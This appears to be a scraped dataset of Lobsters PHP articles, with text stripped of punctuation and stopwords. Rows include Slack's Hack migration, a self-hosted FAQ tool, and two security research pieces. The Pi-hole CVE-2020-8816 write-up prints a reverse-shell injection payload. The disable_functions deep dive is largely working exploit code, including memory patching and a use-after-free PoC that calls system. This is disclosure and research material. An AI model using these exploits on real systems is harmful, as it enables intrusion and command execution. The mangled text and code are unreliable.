without multithreading asyncawait simple abstraction allows function paused waiting io freeing runtime schedule task simply adding async await keywords following guideline code migrated take advantage concurrency without breaking mental model code work example using concurrent code block fetch data two source fetch previously done sequentially adding await concurrent keep code easy read allowing fetch take place concurrently async function getmentions user user awaitable vec mention concurrent fetch user mention atmentions await getatmentions user fetch channel mention channel user channelmentions await getatchannelmentions user return sortmentions atmentions channelmentions breaking php compatibility free hack grow hhvm come long way since slack began using breaking compatibility php controversial decision required u eliminate every last line php code dependency codebase enabled huge efficiency soundness improvement language since hhvm release removed php support developer rapidly removed phpisms inhibit type safety andor performance adding useful new feature keeping update large codebase nearly full time job largest downside leaving php community loss extensive ecosystem open source package packagist luckily hack project still published packagist several high quality one hhast enables expressive lint rule automated code migration syntax tree unlike php package involve parsing token stream slack opensourced hack json schema leverage hack codegen create hack code type definition json schema definition hack sql fake library contributed simulate mysql use unit test handle million sql query every test run slack xhp enables typesafe async serverside rendered html share history react jsx best serverside html framework worked looking forward hack free php past excited see become firstclass language right longer feasible gradually migrate php codebase hack expect see developer choose hack new project language stabilizes especially familiarity php looking something better general trend industry towards adding static type checking interpreted language multiple option python javascript ruby combining convenience interpreted language static type checking worth considering code base size scott sandler principal engineer core infrastructure team slack slack hiring backend engineer
17,Lobsters,php,PHP programming,FAQ Off: Interactive Q&A Platform to Counteract Trolling and Misinformation,https://github.com/soatok/faq-off,faq interactive q platform counteract trolling misinformation,faq faq sealioning anthrokit soatok twitchtv channel brilliant patreon post introduced faq faq feature glance interactive question answer website html markdown support troll spam defense collaboration author author security html purifier stored securely installation getting code dependency database setup webserver configuration let encrypt,faq faq let build gamebookstyle faq website counteract sealioning mob harassment social medium faq selfhostable microservice based slim framework anthrokit developed soatok live twitchtv channel invite link given patreon supporter brilliant tier higher learn please see patreon post introduced faq faq feature glance interactive question answer website guide reader answer question shortcircuit common line disruptive discourse write answer ad nauseum html markdown support troll spam defense administrator enable invite mode requires invitation code existing user sign invitation tree administrator see invited identify common entry point misbehaving user curate community collaboration user share author profile colleague publish group user belong unlimited number author author share access unlimited number user one security entry written html markdown processed html purifier protect crosssite scripting attack password stored securely use twitter username twitter handle knowable administrator randomly generated public id provided keep login handle andor twitter handle anonymous everyone else installation getting code dependency first clone git repository git clone http githubcomsoatokfaqoff targetdirname next run composer install nodev inside destination directory database setup run bincreateconfigphp create local configuration file valid postgresql database credential onhand stage next run bininstall finish installing database table webserver configuration make sure configure virtual host use public directory document root bad varwwwfaqoff good varwwwfaqoffpublic general rule user read readmemd file configured server incorrectly need go another layer highly recommended use http afford tl certificate let encrypt offer free certificate automatic renewal via certbot example nginx configuration might look like server listen ssl listen ssl sslcertificate etcletsencryptlivefaqexamplecomfullchainpem sslcertificatekey etcletsencryptlivefaqexamplecomprivkeypem include snippetssslparamsconf root varwwwfaqoffpublic servername faqexamplecom index indexphp indexhtml indexhtm location php include snippetsfastcgiphpconf fastcgipass unix location first attempt serve request file directory fall back displaying tryfiles uri uri indexphp args location wellknown allow server listen listen root varwwwfaqoffpublic index indexhtml indexhtm servername faqexamplecom location wellknown allow location first attempt serve request file directory fall back displaying tryfiles uri uri redirect http return http faqexamplecom requesturi
18,Lobsters,php,PHP programming,Favourite Diff,https://essays.jwatzman.org/essays/favourite-diff.html,favourite diff,favourite diff,favourite diff want tell story one favourite diffs ever committed probably objective measure personal favourite make good story boot several year ago small team building static analysis typechecking tool idea analysis would help rest large engineering team reduce defect flagship webapp written php despite somewhat unfinished tool already improved life enough made way commit hook core workflow one afternoon u team grabbing lunch together conversation turned recent bug webapp started writing certain kind data onto wrong database huge problem yet potential serious security issue future bit effort expended clean data beyond fixing bug none domain directly affect u thing really got u going source bug switch fallthrough first time something like happened recalled similar incident year code started something subtly wrong due bug switch fallthrough involved one heard every bug made production several caught fixed silly language misfeature complained maybe kind made sense c highlevel language like php really reason switch fall well yet another php design mistake told would great someone could change design language live wait people decide design language u right table agreed stupid fixed okay fine influence design php via typechecking tool absolutely de facto control php used practise company infinite social capital abuse control unpopular thing switch fallthrough exactly beloved feature php banning would likely seen another major win tool somehow seem occurred anyone everyone complaining one suggesting real action realised recently playing around control flow detection knew exactly implement change declared fallthrough done going go back desk remove knew building new module use tiresome cleanup existing usage webapp deploying finally ban construct mad recent bug ragecoded course afternoon cleanup annoying thing go faster expected channel fury power change without stopping everyone team supportive unsurprising given previous conversation cleanup diffs written afternoon mostly annotated clearlyintentional fallthroughs fixed real bug new module found started pushing diffs everyone else interacted working main webapp supportive occasionally little horrified initial diff ban switch fallthrough shipped next release tool day later ending feature resulting bug forever anyone could done tech lead could probably done faster one one going simply occurred anyone position technically organisationally fix often biggest contribution one able fix something one realises something fixable diff favourite one first one impactful still one clearcut case career change want see world
19,Lobsters,php,PHP programming,CVE-2020-8816 – Pi-hole Remote Code Execution,https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/,pihole remote code execution,impact pihole affected technical analysis source exploitation time line 佐藤 秀峰,impact pihole affected remote code execution vulnerability authenticated user web portal execute arbitrary command underlying server privilege local user executing service exploitation vulnerability automated pihole pihole dns server specialized contentfiltering also feature dhcp server according pihole llc dns sinkhole protects device unwanted content without installing clientside software affected pihole web interface version earlier affected technical analysis order configure builtin dhcp server pihole feature webbased user interface user define static dhcp lease pin ip address given mac address processing user input form mac address application adequately validate validate input reusing shell command legitimate mac address format follows aaaaaaaaaaaa mac address input tampered execute arbitrary code aaaaaaaaaaaa w path p w x path h x z path r z p h p ifs r ifs exec affected configuration panel following excerpt contains code responsible vulnerability code section outside code path used exploitation stripped important line code highlighted sake clarity php pihole black hole internet advertisement c pihole llc http piholenet networkwide ad blocking via hardware file copyright latest version eupl please see license file right license basename server scriptfilename settingsphp die direct access script forbidden function validmac macaddr accepted input format ff character may lower case return pregmatch macaddr read available adlists adlist readadlists read available dns server list dnsserverslist readdnsserverslist error success isset post field handle csrf checkcsrf isset post token post token process request switch post field case dhcp isset post addstatic mac post addmac ip post addip hostname post addhostname validmac mac error mac address htmlspecialchars mac invalid br mac strtoupper mac validip ip strlen ip error ip address htmlspecialchars ip invalid br validdomain hostname strlen hostname error host name htmlspecialchars hostname invalid br strlen hostname strlen ip error omit ip address host name br strlen hostname hostname nohost strlen ip ip noip test lease already included readstaticleasesfile foreach dhcpstaticleases lease lease hwaddr mac error static release mac address htmlspecialchars mac already defined br break ip noip lease ip ip error static lease ip address htmlspecialchars ip already defined br break lease host hostname error static lease hostname htmlspecialchars hostname already defined br break strlen error exec sudo pihole addstaticdhcp mac ip hostname success new static address added break isset post removestatic mac post removestatic validmac mac error mac address htmlspecialchars mac invalid br mac strtoupper mac strlen error exec sudo pihole removestaticdhcp mac success static address mac address htmlspecialchars mac removed break default option found debug true break pihole dashboard savesettingsphp original code source exploitation biggest difficulty exploiting vulnerability user input capitalized call strtoupper lower case character used resulting injection typically injection would look like aaaaaaaaaaaa php r sockfsockopen exec binsh injection would capitalized php r linux command case sensitive would fail yielding sh php found error one way overcome difficulty make use environment variable nightmareinducing posix shell parameter expansion note sh shell used inducing path environment variable leak possible fetch path environment variable server postpending path mac address new static dhcp lease path environment variable leakage luckily u path contains string pihole usr turn contains p h r lowercase character letter need write php r optpihole usrlocalsbin usrlocalbin usrsbin usrbin sbin bin path environment variable possible define p h r shell parameter contain matching lowercase character following posix shell parameter expansion w path p w x path h x z path r z shell parameter introduced injection rewritten p h p ifs r ifs exec note neither php function hexadecimal case sensitive ifs corresponds default shell delimiter character space finally complete reverse shell payload aaaaaaaaaaaa w path p w x path h x z path r z p h p ifs r ifs exec time execute injecting reverse shell payload receiving shell enumerating sudoers action privilege escalation left exercise reader time line françois renaudphilippon disclosed vulnerability pihole llc february llc acknowledged receiving report february llc fixed vulnerability release pihole web interface february llc authorized public disclosure february pihole logo registered trademark pihole llc art 秀峰
20,Lobsters,php,PHP programming,A deep dive into disable_functions bypasses and PHP exploitation,https://www.blackarrow.net/disable-functions-bypasses-and-php-exploitation/,deep dive disablefunctions bypass php exploitation,gentle flight php internals disablefunctions internal function userdefined function anonymous function zif z f handler disablefunctions disablefunctions learning practice sparring phpcli selfpatching procselfmem work modern web server note flyweight combat debugbacktrace exploit uaf note refcount scouting new rival finding lowhanging fruit grammaraware fuzzing disablefunctions interesting disablefunctions playing league alternative way bypass disablefunctions disablefunctions chankro execve execve conclussions disablefunctions reference source code basicfunctions source code procfs bypass beched escapeshellcmd basicfunctions php debugbacktrace uaf exploit bug useafterfree accessing already destructed backtrace argument debugging memory php internals book string management zendstring php internals book c struct hack basic structure php internals book zendclosure source code stdobjecthandlers source code zendinternalfunction source code php bug tracker php clasification security issue fuzzing unserialize function fuzzing php fun profit exploiting unserialize fuzzing grammar fuzzing book phpast github superion grammaraware greybox fuzzing domato dom fuzzer domatophp hunting hidden parameter within php builtin function using frida stupid php gdb helper faster fuzzing python imapopen command injection chankro tool bypass disablefunctions openbasedir bypass disablefunctions openbasedir,performing intrusion test red team operation multiple tool webshells proxysocks tunnel tcp traffic http pivot etc tend deployed compromised web server custom script case server may le bastioned making somewhat difficult compromise one common configuration found php environment use disablefunctions restrict function used php script avoid using dangerous one system passthru etc article take indepth look php directive work circumvent itin summary article aim shed light following topic explanation php internalsautomation search evasion technique based memory corruptionsearching vulnerability fuzzingdescription exploitation techniquesa gentle flight php internals disablefunctionsbefore dive explaining find vulnerability exploit first necessary understand basic concept php work internally following section go deeper certain topic let see key aspect work first functionsin php find main type function internal function standard function provided php installed extension eg compiled userdefined function created running script eg function minorthreat finally anonymous function closure function created script defined name eg name function band printf listen n band internal function usually declared using macro phpfunction phpnamedfunction etc parameter receive also defined macro zendparseparametersstart zendparseparametersend example source code follows phpfunction char str zendbool strict sizet strlen zendstring result zendparseparametersstart zparamstring str strlen zparamoptional zparambool strict zendparseparametersend result unsigned char str strlen strict result null returnstr result else returnfalse looking source code seen parameter function receives defined turn macro depending type case function expects mandatory string parameter optional boolean one code compiled function appear symbol preceded prefix zif acronym zend iinternal function objdump usrlocalbinphp grep zif tail g f text ziffgets g f text ziffwrite g f text ziffgetss g f text ziffread g f text zifdisplaydisabledfunction g f text zifrewind g f text zifftell g f text ziffseek g f text zifdl g f text ziffflushinternal function registered zend engine using zendfunctionentry structure defined follows typedef struct zendfunctionentry const char fname void handler internalfunctionparameters const struct zendinternalarginfo arginfo numargs flag zendfunctionentry first two member stand structure hold function name handler say case function str first member pointing str string second one zifstr function basic function grouped basicfunctions registration array zendfunctionentry structure therefore basicfunctions ultimately ordered relationship function name along pointer handler internal userdefined function registered zend engine using hashtable called functiontable whenever php script make function call handler function searched hashtable disablefunctions directive actthis directive mark application function zenddisablefunction functiontable definedzendapi int zenddisablefunction char functionname sizet functionnamelength zendinternalfunction func func zendhashstrfindptr cg functiontable functionname functionnamelength zendfreeinternalarginfo func func fnflags zendaccvariadic zendacchastypehints zendacchasreturntype func numargs func arginfo null func handler zendfn displaydisabledfunction return success return failure seen code zenddisablefunction search hashtable target function change original handler displaydisabledfunction zendapi zendcold zendfunction displaydisabledfunction zenderror ewarning disabled security reason getactivefunctionname therefore disabled function called php script instead original function executed function showing error message executed disablefunctions affect functiontable original handler found effect reversed patching functiontable calling function directly dive concept detail belowlearning practice sparring phpcli selfpatching procselfmemto put concept seen previous section together aiming able exploit vulnerability later let see work process memory perform disablefunctions evasion step going done using primitive arbitrary reading writing developing exploit example heap binary address leaked go without saying technique work modern web server although true technique used past phpcli sparring training jumping real exploit end section understood everything right pathnote section using php installed debian using aptget install php cli built feb nt road map quite simple locate address binary heap section mappedfind handler code zifsystem another function receives string parameter zifucfirst locate functiontable heap replace function handler entry ucfirst one zifsystemcall ucfirst using system command parameter would system first step directly parse entry procselfmaps next section see information would obtained real exploit rough approximation could following function memmaps print parsing mapped memory region n target array rawmap explode phpeol filegetcontents procselfmaps check foreach rawmap line substr line check strpos line r p false range explode line splitrange explode range target binstart hexdec splitrange target binend hexdec splitrange check substr line heap range explode line splitrange explode range target heapstart hexdec splitrange target heapend hexdec splitrange print binary dechex target binstart dechex target binend n print heap dechex target heapstart dechex target heapend n return target also need couple auxiliary function able work raw process memory use combination fseek fread perform arbitrary reading desired memory address function getdata fd address size fseek fd address data fread fd size return data function value return hexdec strrev value function value return strrev dechex value extracted base address using previously declared memmaps elf header parsed obtain information memory range look basicfunctions array function parseelf base http wikiosdevorgelftutorial parsed array fd fopen procselfmem rb parsed type getdata fd base parsed phoff getdata fd base parsed phentsize getdata fd base parsed phnum getdata fd base parsed phnum header base parsed phoff parsed phentsize parsed ptype getdata fd header parsed pflags getdata fd header parsed pvaddr getdata fd header parsed pmemsz getdata fd header parsed ptype parsed pflags parsed dataaddr parsed type parsed pvaddr base parsed pvaddr parsed datasize parsed pmemsz else parsed ptype parsed pflags parsed textsize parsed pmemsz return parsed previous section saw array composed zendfunctionentry structure first two member pointer function name handler therefore want locate pointer zifucfirst zifsystem sequentially extract block use value address read byte case valid memory address byte correspond function name mean position memory address found corresponds fname field zendfunctionentry structure therefore field containing target handler byte laterlooking handlersthis procedure would used locate entry function escapeshellcmd zifsystem distance function gethandlers base dataaddr textsize datasize print searching handler basicfunctions n handler array fd fopen procselfmem rb datasize test getdata fd dataaddr test base test base dataaddr base fname getdata fd test fname ucfirst python c ucfirst print encode hex handler ucfirst getdata fd dataaddr print zifucfirst found dechex handler ucfirst n continue else fname escapeshellcmd python c escapesh print encode hex handler system getdata fd dataaddr print zifsystem found dechex handler system n return handler point know location zifucfirst remains scan heap address found functiontable replace zifsystem function scanandpatch base final old new print scanning heap locate functiontablen fd fopen procselfmem rb final base test getdata fd base test old print zifucfirst referenced dechex base n fseek fd base print patching ucfirst zifsystem handlern fwrite fd new return modifying functiontable way calling ucfirst system actually disablefunctionssystem disablefunctionspocphp bypassing disablefunctions openbasedir misconfigured poc parsing mapped memory region binary heap searching handler basicfunctions zifucfirst found zifsystem found scanning heap locate functiontable zifucfirst referenced patching ucfirst zifsystem handler calling ucfirst uname linux insulaservus smp debian gnulinuxif concept explained far clear start battling real vulnerability create exploitsa flyweight combat debugbacktrace exploit uaf vulnerability peculiarity exploitation greatly differ one another likewise difficulty problem solved different case nevertheless section going analyze exploit quite simple vulnerability allow u put practice different concept seen previous section analyze rebuild useafterfree exploit debugbacktrace note section use php compiled symbol without optimization php cli built mar nt configure cflags g make j nproc sudo make installthe script exploit vulnerability reported year ago small example bugtracker thread trigger problem php class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg triggeruaf x identify existence useafterfree uaf using valgrind run export prior invalid write size zvaladdrefp debugbacktracegetargs zendfetchdebugbacktrace zenddefaultexceptionnewex zenddefaultexceptionnew objectandpropertiesinit objectinitex zendnewspecconsthandler executeex zendcallfunction zendcallmethod zendobjectsdestroyobject zendobjectsstoredel address byte inside block size free free efree zendstringfree zvaldtorfunc izvalptrdtor zvalptrdtor zendstdunsetproperty zendunsetobjspecunusedconsthandler executeex zendcallfunction zendcallmethod zendobjectsdestroyobject zendobjectsstoredel zvaldtorfunc block alloc malloc zendmalloc emalloc zendstringalloc zendstringinit zifstrshuffle zenddoicallspecretvalusedhandler executeex zendexecute zendexecutescripts phpexecutescript docli main confirming exploitability vulnerability trivial php function pwn global canary backtrace class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args dummy strshuffle strrepeat b print canary print bbb bbbb pwn showed printing variable canary actually got content dummy previous example instead using string fill gap left use object able see representation memory php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper function x print canary pwn however see regular string usrlocalbinphp uafphp aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaif instead using print use debugzvaldump see refcount field hold wrong value usrlocalbinphp uafphp string aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa refcount php string represented using structure zendstring structure store string group char instead pointer struct zendstring zendrefcountedh gc zendulong h sizet len char val char turn variable zend engine called zval value contained following structure typedef union zendvalue zendlong lval double dval zendrefcounted counted zendstring str zendarray arr zendobject obj zendresource re zendreference ref zendastref ast zval zv void ptr zendclassentry ce zendfunction func struct ww zendvalue knowing information fixing object size number property get leaked memory string php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public b c contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper b function x address canary canary canary canary canary canary canary canary print strrev address vardump pwn execute usrlocalbinphp uafphp check value corresponds memory address stdobjecthandlers pwndbg xx stdobjecthandlers arbitrary relative reading writing interpreting canary string access byte array canary x need achieve absolute arbitrary reading able read content valid memory address use one helper object property let put breakpoint vardump proceed following example php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public b c contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper b function x helper kkkk vardump helper pwn inspecting memory get following pwndbg xg args pwndbg pointer zendstring see pointer zendstring structure containing kkkk string pwndbg kkkk inspecting structure pwndbg print zendstring gc refcount u v type flag gcinfo typeinfo h len val k relative writing change zendstring structure pointer point different valid memory address able leak content let try changing pointer one taken debugger testing php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public b c function str p address j j j address address ord str p j return address function write str p v n n str p chr v v contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper b function x phpheap canary canaryaddr phpheap write canary write canary write canary hexdec random valid address use test write canary vardump helper pwn indeed point address indicated pwndbg pointer used test interpreted zendstring memory area leak information example make strlen helper pwndbg pwndbg print zendstring gc refcount u v type u flag u gcinfo typeinfo h len val ability leak arbitrary content possible repeat procedure followed previous section order identify zifsystem handler instead patching internal function handler functiontable choose reuse anonymous function created helper b anonymous function closure following structure typedef struct zendclosure zendobject std zendfunction func zval thisptr zendclassentry calledscope zifhandler originternalhandler zendclosure within func field zendfunction find zendinternalfunction structure typedef struct zendinternalfunction common element zenduchar type zenduchar argflags bitset arginfopassbyreference fnflags zendstring functionname zendclassentry scope zendfunction prototype numargs requirednumargs zendinternalarginfo arginfo end common element zifhandler handler struct zendmoduleentry module void reserved zendmaxreservedresources zendinternalfunction look like following gdb type argflags fnflags functionname scope prototype numargs requirednumargs arginfo handler module reserved overwriting field handler one zifsystem modifying field type mark internal function userdefined one system function would called complete exploit look like php php disablefunctions bypass poc nix bug http bugsphpnetbugphp debugbacktrace return reference variable destroyed causing uaf vulnerability exploit work php version released author http pwn uname function pwn cmd global abc helper backtrace class vuln public public function destruct global backtrace unset backtrace new exception gettrace isset backtrace args php backtrace debugbacktrace class helper public b c function str p address j j j address address ord str p j return address function ptr chr ptr ptr return function write str p v n n str p chr v v function leak addr p global abc helper write abc addr p leak strlen helper leak return leak function parseelf base etype leak base ephoff leak base ephentsize leak base ephnum leak base ephnum header base ephoff ephentsize ptype leak header pflags leak header pvaddr leak header pmemsz leak header ptype pflags ptload pfreadwrite handle pie dataaddr etype pvaddr base pvaddr datasize pmemsz else ptype pflags ptload pfreadexec textsize pmemsz dataaddr textsize datasize return false return dataaddr textsize datasize function getbasicfuncs base elf list dataaddr textsize datasize elf datasize leak leak dataaddr leak base leak base dataaddr base deref leak leak constant constant check deref continue else continue leak leak dataaddr leak base leak base dataaddr base deref leak leak constant check deref continue else continue return dataaddr function getbinarybase binaryleak base start binaryleak addr start leak leak addr leak elf header return addr function getsystem basicfuncs addr basicfuncs fentry leak addr fname leak fentry fname system return leak addr addr fentry return false function triggeruaf arg strshuffle prevents opcache string interning arg strshuffle strrepeat vuln new vuln vuln arg stristr phpos win die poc nix system nalloc increase value uaf fails contiguous nalloc contiguous strshuffle strrepeat triggeruaf x abc backtrace args helper new helper helper b function x strlen abc strlen abc die uaf failed leak closurehandlers abc phpheap abc abcaddr phpheap fake value write abc write abc fake reference write abc abcaddr write abc closureobj abc binaryleak leak closurehandlers base getbinarybase binaryleak die could nt determine binary base address elf parseelf base die could nt parse elf header basicfuncs getbasicfuncs base elf die could nt get basicfunctions address zifsystem getsystem basicfuncs die could nt get zifsystem address fake closure object fakeobjoffset write abc fakeobjoffset leak closureobj pwn write abc abcaddr fakeobjoffset write abc internal func type write abc zifsystem internal func handler helper b cmd exit scouting new rival finding lowhanging fruit grammaraware fuzzingthe previous section focused php internals explaining exploit vulnerability subvert effect disablefunctions directive section address issue related fuzzing vulnerability searching zend enginebefore diving subject worth mentioning lot crash reported bug php bug tracker may exploitable go unnoticed case example vulnerability exploited previous section problem known year situation occur various reason whoever open ticket bug tracker provide enough information andor code attached long short making difficult identify root cause even verify reproducibility crashthe issue considered minor bug considered security problem fix postponed criterion php classifies bug bug arbitrary usercontrolled code used considered security issue practice time translates local vulnerability must reported regular bugsthe root cause bug difficult fix proposed patch fix problem completelyso interesting check bug tracker vulnerability hidden plain sight hand checking engine component prone problem allows u focus effort besides fuzzing common rediscover crash people previously identified reportedthere multiple approach search php vulnerability fuzzing term focus technique use regarding focus unlikely find vulnerability language parser worth spending time historically design php deserialization unserialize quite problematic security flaw always appear addition exploitation prone lead rce although currently use unserialize discouraged various cm platform make use function serialized data user control cooky several article covering basic fuzzing function exploitation goal identifying vulnerability may allow circumventing disablefunctions code flow allows u obtain arbitrary read write memory primitive sufficient context contrasting past experience preferable follow approach focused finding superficial shallow crash rather focus specific component stream packunpack domxml etc word maximize result making minimum effort end follow fuzzing strategy generating grammatically valid portion php code ie executed return syntax error without taking account feedback generating new test case strategy follow performing simple mutation ast level using project like phpast even going extending afl capability perform mutation superion project case domato used generating test case modified phporiented version recently published name domatophp interesting thing modified version includes dictionary rule function definition allowing u save lot time however possible considerably improve amount unique crash identified making improvement example function parameter definition extracted parsing phpnet documentation source information sometimes completely accurate eg string parameter actually path existence hidden undocumented parameter etc complement function definition brought domatophp two strategy followed one hand real parameter extracted directly source code parsing macro hand error message analyzed done using simple gdb script extracting parameterson hand domato allows assigning probability rule applies code generation interesting certain fuzzed parameter example case function use file directory path interesting always use random text string usually function first validate path characteristic file directory readwrite permission playing different parameter path file readonly permission another one write permission directory etc possible reach different state pathfuzz stringfuzz pathfuzz pathrwfuzz pathfuzz pathrofuzz pathfuzz pathdirfuzz improvement use strshuffle deal cache optimization regular call vardump increased number parameter vary etc run test case small c code created make use posixspawn parallel start process vfork provides acceptable speed run per secondthe test case generated crash simplified synthesized small python script start php script hundred line look like try try simplexmlloadfile strrepeat chr strrepeat chr strrepeat chr strrepeat chr strrepeat chr implode arraymap function c return x strpad dechex c range true catch exception e catch error e try try var splobjectstorage offsetget var arrayrand var catch exception e catch error e try try var reflectionproperty getname catch exception e catch error e try try var spldoublylinkedlist shift catch exception e catch error e try try var splfixedarray setsize catch exception e catch error e try try var splfixedarray count catch exception e catch error e try try mbhttpinput strrepeat catch exception e catch error e try try var reflectionproperty setvalue catch exception e catch error e try try strsplit implode arraymap function c return x strpad dechex c range catch exception e catch error e try try ctypeupper strrepeat chr strrepeat chr catch exception e catch error e try try var splfixedarray rewind catch exception e catch error e try try var reflectionproperty isdefault catch exception e catch error e try try var domdocument createcomment strrepeat catch exception e catch error e try try striptags strrepeat chr strrepeat chr strrepeat chr catch exception e catch error e try try strrpos strrepeat catch exception e catch error e try try var reflectionproperty isprotected catch exception e catch error e try try ctypealnum etcpasswd catch exception e catch error e try try var domelement setattributenodens new domattr attr catch exception e catch error e try try streamwrapperunregister strrepeat chr catch exception e catch error e try try var reflectionclass hasmethod strrepeat chr catch exception e catch error e end one much easier understand debug later php aaa new simplexmlelement aaaa xpath strrepeat chr real crash found first minutesthis size reduction test case together simplification allows first classification term affected component well comparing crash among rule duplicate execution trace also used call stack instruction caused segfault asan output etc considering part general operation scheme following operation schemefinally need analyze crash check one caused real vulnerability instead simple bugplaying league alternative way bypass disablefunctionsin addition vulnerability allow arbitrary memory manipulation case possible execute system command despite restriction imposed disablefunctions seen previous section directive work changing handler disabled function possible classic vulnerability command injection identified among enabled function allowing exploited order achieve arbitrary command execution example happened recently function imapopen another case take place whenever function putenv enabled conjunction function initiate external process eg mail default executes sendmail binary technique used tool chankro execute arbitrary binary using ldpreload case find common pattern php end invoking syscalls execve start new process using domatophp grammar rule conjunction improvement gdb script possible create test case function registered zend engine check execve another interesting syscall calledwhile read p cat templatephp alchitopophp echo p alchitopophp echo p logtxt strace f php r eval filegetcontents php stdin alchitopophp grep exe grep sh logtxt rm alchitopophp done funcstxtin case minimal compilation extension mail appears candidate checking syscallsit interesting check function new php version well install extension different distros use default order detect new way exploitation conclussionsin article discussed depth disablefunctions work well exemplified exploitation php vulnerability bypass likewise methodology identifying new vulnerability explained fuzzing process search alternative mail putenv must continuously executed time refreshing target new version php also interesting use different build option special emphasis extension based common distribution reference source code basicfunctions source code procfs bypass beched escapeshellcmd basicfunctions php debugbacktrace uaf exploit bug useafterfree accessing already destructed backtrace argument debugging memory php internals book string management zendstring php internals book c struct hack basic structure php internals book zendclosure source code stdobjecthandlers source code zendinternalfunction source code php bug tracker php clasification security issue fuzzing unserialize function fuzzing php fun profit exploiting unserialize fuzzing grammar fuzzing book phpast github superion grammaraware greybox fuzzing domato dom fuzzer domatophp hunting hidden parameter within php builtin function using frida stupid php gdb helper faster fuzzing python imapopen command injection chankro tool bypass disablefunctions openbasedir bypass disablefunctions openbasedir
21,Lobsters,php,PHP programming,The Resurrection of PHPUnit RCE Vulnerability,https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/,resurrection phpunit rce vulnerability,scope study security announcement figure phpunit campaign statistic deep dive detail evalstdinphp php input php stdin sapi server api php input php stdin function filegetcontents eval php input evalstdinphp additional fix evalstdinphp phpsapi evalstdinphp figure flow diagram new phpunit attack tweet used anymore actually case conclusion vulnerable observed case infected,software patch released tend believe mean problem solved time however actually case fully solving problem requires developer grab latest patch version deploy environment since upgrading especially trivial action developer need plan ahead insert change via development process scheduling proper time deploy case describe see sometimes even enough part study carried imperva observed around nine million attack attempt exploit vulnerability one exploitable cf came wonder old vulnerability resurrected become popular among attacker attack attempt year around seven million last six month around two million january saw around percent attack conducted last two month january scope understand hype around particular cve need understand vulnerability look exploited fixed article go aspect june remote code execution vulnerability disclosed phpunit widelyused testing framework php used perform unit test application development cycle unfortunately many development process optimal framework stay enabled production make attacker life sweet easy since used variety popular cm content management system wordpress drupal prestashop well many module developed third party scope security breach quite wide example several known module deploy production including phpunit framework prestashop autoupgrade pscartabandonmentpro psfacetedsearch gamification pscheckout wordpress jekyll exporter plugin dzsvideogallery cloudflare mediawiki moodle drupal mailchimpmailchimp commerce drupal published public service announcement make clear even patch phpunit perse still vulnerable using framework relies old version study first step study search cve medium saw thread published tech community forum middecember user complaining suspicious file possibly injected phpunit folder addition january prestashop ecommerce solution written php published security announcement regarding phpunit vulnerability exploited malware named xsamxadoo bot could used gain access php server take control seen malware activity since january went back data analyze phpunit attack targeting user found prestashop release covered tip iceberg one campaign trying exploit vulnerability figure see least ten campaign last three month although xsamxadoo one definitely largest reviewing campaign important clearly define campaign attack attempt us payload used multiple ip target multiple site figure phpunit campaign statistic campaign name number request number attacking ip number site max attack per day ssspphp traber rcevuln killphp probing xsamxadoobot campaign detail see top two campaign ssspphp traber maximum number eight million four million attack per day respectively figure see campaign attack divided percentage let see campaign timeline last three month timeline learn many campaign active long time furthermore see two peak two leading campaign ssspphp traber two specific date november january even though vulnerability two year old hacker still trying luck exploiting prestashop identified one campaign definitely waiting vulnerable server fall net deep dive detail understand root issue leading vulnerability let first look fix phpunit evalstdinphp file november explain php input v php stdin mean first need know sapi mechanism control interaction outside world php engine sapi stand server api php input intended use webbased remote sapis php stdin intended use cli local sapis function filegetcontents read entire file string eval executes string php input readonly stream allows read raw data request body original php code get file via input stream convert string executes allows attacker run arbitrary code via http request evalstdinphp change remove ability pas file input sent webbased context file expects input stdin local december additional fix added evalstdinphp without cve pointing security patch explain change need understand phpsapi mean php run web server module cgi common gateway interface application command line cli script adding condition evalstdinphp file developer aiming eliminate option execute php file context cli phpdbg recall previous change developer changed usage php input php stdin adding restriction cli phpdbg narrowing access running arbitrary php server thing one assumption possibility exploiting code somehow passing arbitrary code via stdin attacker might use cgi bypass stdin limitation since cgi run locally server pas parameter via stdin leaving application vulnerable even applying fix mentioned flow diagram assume new attack could look like figure flow diagram new phpunit attack january saw several tweet related phpunit vulnerability saying additional vulnerability phpunit version discovered yet published phpunit maintainer confirmed vulnerability cve request submitted suspiciously however date evalstdinphp deleted phpunit repository comment used anymore actually case actually suspect removed potential risk mentioned via local access evalstdinphp let wrap event mentioned together within timeline short timeline chain event conclusion old vulnerability gone world moment patch published requires developer using vulnerable framework perform update although ignore recommendation either mistake purpose never apply patch patching considered annoying endless step development cycle since new patch continuously published therefore many framework thirdparty module using latest available code hacker know still try luck old vulnerability often great success addition old phpunit vulnerability used good indication pointing new vulnerability phpunit yet published possible phpunit version containing evalstdinphp affected aware might unknowingly using vulnerable module developed third party using phpunit framework without removing publishing production vulnerable check phpunit exists production webserver phpunit version possible vulnerable specific server configuration recommended remove although observed case removal phpunit cause unexpected behavior webserver also possible block remote access vendor directory root path phputil framework infected check new file phpunit path check core file changed lately safe secure imperva
